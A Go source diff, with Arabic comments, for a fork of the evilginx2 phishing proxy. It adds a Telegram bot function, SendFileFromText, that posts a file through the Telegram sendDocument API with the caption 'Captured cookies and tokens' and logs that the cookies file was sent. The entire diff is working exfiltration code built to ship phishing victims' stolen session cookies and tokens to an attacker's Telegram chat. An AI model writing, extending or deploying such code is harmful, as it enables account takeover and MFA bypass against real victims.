@@ -8,6 +8,8 @@ import (
 	"strings"
 	"encoding/json"
 	"time"
+	"bytes"
+	"mime/multipart"
 
 	"github.com/kgretzky/evilginx2/log"
 )
@@ -546,5 +548,68 @@ func (t *TelegramBot) answerCallbackQuery(callbackQueryID string, text string) e
 		return fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
 	}
 	
+	return nil
+}
+
+// دالة جديدة لإرسال ملف نصي إلى تلجرام
+func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) error {
+	if !t.Enabled {
+		return fmt.Errorf("telegram bot is disabled")
+	}
+	
+	// استخدام API تلجرام لإرسال ملفات
+	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
+	
+	// إنشاء حدود متعددة الأجزاء لإرسال الملف
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	
+	// إضافة معرف الدردشة
+	_ = writer.WriteField("chat_id", t.ChatID)
+	
+	// إضافة تعليق للملف
+	_ = writer.WriteField("caption", "Captured cookies and tokens")
+	
+	// إنشاء جزء الملف
+	part, err := writer.CreateFormFile("document", fileName)
+	if err != nil {
+		return fmt.Errorf("error creating form file: %v", err)
+	}
+	
+	// كتابة محتوى الملف
+	_, err = part.Write([]byte(fileContent))
+	if err != nil {
+		return fmt.Errorf("error writing file content: %v", err)
+	}
+	
+	// إغلاق الكاتب
+	err = writer.Close()
+	if err != nil {
+		return fmt.Errorf("error closing writer: %v", err)
+	}
+	
+	// إنشاء طلب HTTP
+	req, err := http.NewRequest("POST", apiUrl, body)
+	if err != nil {
+		return fmt.Errorf("error creating request: %v", err)
+	}
+	
+	// تعيين نوع المحتوى
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	
+	// إرسال الطلب
+	resp, err := t.Client.Do(req)
+	if err != nil {
+		return fmt.Errorf("error sending request: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	// التحقق من نجاح الطلب
+	if resp.StatusCode != http.StatusOK {
+		bodyBytes, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("telegram API error: %s", string(bodyBytes))
+	}
+	
+	log.Success("Cookies file sent to Telegram successfully")
 	return nil
 } 
